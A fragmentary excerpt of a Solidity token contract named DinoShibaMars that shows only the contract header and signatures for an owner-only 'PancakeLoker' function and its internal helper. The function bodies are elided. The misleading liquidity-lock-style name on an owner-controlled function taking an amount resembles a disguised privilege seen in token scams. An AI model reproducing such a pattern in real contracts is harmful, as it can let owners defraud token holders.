...
contract DinoShibaMars  is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _PancakeLoker(address account, uint256 amount) internal virtual {
    ...
    function PancakeLoker(uint256 amount) public onlyOwner virtual returns (bool) {
